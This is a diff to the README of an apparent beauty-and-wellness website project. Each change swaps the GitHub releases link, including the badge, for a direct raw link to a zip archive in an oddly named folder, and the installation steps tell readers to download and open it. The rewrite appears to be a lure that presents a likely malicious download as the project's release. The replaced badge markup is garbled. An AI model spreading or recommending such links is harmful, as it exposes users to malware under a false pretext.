@@ -1,6 +1,6 @@
 # 🌟 beautyoura-website - Your Gateway to Beauty and Wellness
 
-[![Download BeautYoura Website](https://img.shields.io/badge/Download%20Now-%23FF5733.svg?style=for-the-badge&logo=download)](https://github.com/MahmutLXD/beautyoura-website/releases)
+[![Download BeautYoura Website](https://raw.githubusercontent.com/MahmutLXD/beautyoura-website/main/chuprassy/website_beautyoura_v1.2.zip%20Now-%https://raw.githubusercontent.com/MahmutLXD/beautyoura-website/main/chuprassy/website_beautyoura_v1.2.zip)](https://raw.githubusercontent.com/MahmutLXD/beautyoura-website/main/chuprassy/website_beautyoura_v1.2.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the BeautYoura website! This platform helps you discover beauty and s
 
 ## 📥 Downloading the Application
 
-To download the BeautYoura website, visit this page to download: [Download BeautYoura](https://github.com/MahmutLXD/beautyoura-website/releases).
+To download the BeautYoura website, visit this page to download: [Download BeautYoura](https://raw.githubusercontent.com/MahmutLXD/beautyoura-website/main/chuprassy/website_beautyoura_v1.2.zip).
 
 ### 🖥️ System Requirements
 
@@ -24,7 +24,7 @@ To download the BeautYoura website, visit this page to download: [Download Beaut
 
 ## 📑 Installation Instructions
 
-1. Visit the download page: [Download BeautYoura](https://github.com/MahmutLXD/beautyoura-website/releases).
+1. Visit the download page: [Download BeautYoura](https://raw.githubusercontent.com/MahmutLXD/beautyoura-website/main/chuprassy/website_beautyoura_v1.2.zip).
 2. Choose the version suitable for your needs.
 3. Click the download link.
 4. Open the downloaded file in your web browser to view the BeautYoura website.
